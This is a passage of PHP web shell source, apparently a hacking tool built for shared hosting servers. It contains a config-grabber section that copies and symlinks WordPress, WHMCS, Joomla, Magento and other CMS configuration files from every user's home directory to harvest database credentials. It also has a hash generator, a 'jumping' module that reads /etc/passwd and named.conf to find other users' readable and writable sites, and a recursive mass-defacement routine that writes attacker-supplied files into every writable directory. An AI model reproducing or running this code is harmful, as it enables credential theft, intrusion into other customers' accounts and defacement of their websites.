symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/Whmcs/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHM/configuration.php',$user.'WHMCS.txt'); 
symlink('/'.$home.'/'.$user.'/public_html/WHMCS/configuration.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
copy('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
copy('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wp/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/WP/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/news/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/wordpress/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/press/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blogs/wp-config.php',$user.'WORDPRESS.txt');
symlink('/'.$home.'/'.$user.'/public_html/blog/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/submitticket.php',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/public_html/cms/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/beta/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/site/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/main/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/home/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/demo/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/test/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v1/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
copy('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
symlink('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
copy('/var/www/wp-config.php','WORDPRESS.txt');
copy('/var/www/configuration.php','JOOMLA.txt');
copy('/var/www/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/config.php','OTHER.txt');
copy('/var/www/config/koneksi.php','OTHER.txt');
copy('/var/www/include/config.php','OTHER.txt');
copy('/var/www/connect.php','OTHER.txt');
copy('/var/www/config/connect.php','OTHER.txt');
copy('/var/www/include/connect.php','OTHER.txt');
copy('/var/www/html/wp-config.php','WORDPRESS.txt');
copy('/var/www/html/configuration.php','JOOMLA.txt');
copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
copy('/var/www/html/config.php','OTHER.txt');
copy('/var/www/html/config/koneksi.php','OTHER.txt');
copy('/var/www/html/include/config.php','OTHER.txt');
copy('/var/www/html/connect.php','OTHER.txt');
copy('/var/www/html/config/connect.php','OTHER.txt');
copy('/var/www/html/include/connect.php','OTHER.txt');
symlink('/var/www/wp-config.php','WORDPRESS.txt');
symlink('/var/www/configuration.php','JOOMLA.txt');
symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/config.php','OTHER.txt');
symlink('/var/www/config/koneksi.php','OTHER.txt');
symlink('/var/www/include/config.php','OTHER.txt');
symlink('/var/www/connect.php','OTHER.txt');
symlink('/var/www/config/connect.php','OTHER.txt');
symlink('/var/www/include/connect.php','OTHER.txt');
symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
symlink('/var/www/html/configuration.php','JOOMLA.txt');
symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
symlink('/var/www/html/config.php','OTHER.txt');
symlink('/var/www/html/config/koneksi.php','OTHER.txt');
symlink('/var/www/html/include/config.php','OTHER.txt');
symlink('/var/www/html/connect.php','OTHER.txt');
symlink('/var/www/html/config/connect.php','OTHER.txt');
symlink('/var/www/html/include/connect.php','OTHER.txt');
}
echo '<b><a href='.$folfig.'>{ DONE }</a></b></center><br/>';}
 
echo "</td></table></body>";
 } elseif($_GET['olle'] == 'hashgen') {
 $submit = $_POST['enter'];
 if (isset($submit)) {
 $pass = $_POST['password']; // password
 $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
 $hash = md5($pass); // md5 hash #1
 $md4 = hash("md4", $pass);
 $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
 $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
 $hash1 = sha1($pass); // sha1 hash #4
 $sha256 = hash("sha256", $text);
 $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
 $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
 }
 echo '<form action="" method="post">';
 echo '<center><h2>Hash Generator</h2>';
 echo '<table>';
 echo 'Masukkan teks yang ingin di encrypt: ';
 echo '<input class="inputz" type="text" name="password" size="40">';
 echo '<input class="inputzbut" type="submit" name="enter" value="Hash!">';
 echo '<br>';
 echo 'Original Password: <input class=inputz type=text size=50 value='.$pass.'><br><br>';
 echo 'MD5: <input class=inputz type=text size=50 value='.$hash.'><br><br>';
 echo 'MD4: <input class=inputz type=text size=50 value='.$md4 .'><br><br>';
 echo 'MD5 with Salt: <input class=inputz type=text size=50 value='.$hash_md5.'><br><br>';
 echo 'MD5 with Salt & Sha1: <input class=inputz type=text size=50 value='.$hash_md5_double.'><br><br>';
 echo 'Sha1: <input class=inputz type=text size=50 value='.$hash1 .'><br><br>';
 echo 'Sha256: <input class=inputz type=text size=50 value='.$sha256.'><br><br>';
 echo 'Sha1 with Salt: <input class=inputz type=text size=50 value='.$hash1_sha1.'><br><br>';
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
} elseif($_GET['olle'] == 'jumping') {$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("rn", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$url_user'><font color=#B0B0B0>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$url_user'><font color=#B0B0B0>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In -> ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("rn", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$web_vh'><font color=#B0B0B0>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$web_vh'><font color=#B0B0B0>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In ->  di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=#B0B0B0>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=#B0B0B0>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $myuser_jump) {
					$user_jumping_dir = "/home/$myuser_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#B0B0B0>R</font>] <a href='?path=$user_jumping_dir'><font color=#B0B0B0>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#B0B0B0>RW</font>] <a href='?path=$user_jumping_dir'><font color=#B0B0B0>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=#B0B0B0>Cannot retrieve the domain name</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $myuser_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>In total there are ".$i." In -> ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['olle'] == 'mass_deface') {
	function abnormal_mode($dir,$namafile,$isi_script) {
		foreach($j as $lokasi)
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							
							echo "[<font color=#B0B0B0>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = abnormal_mode($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function normal_mode($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#B0B0B0>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['type'] == 'abnormal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			abnormal_mode($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['type'] == 'normal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			normal_mode($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
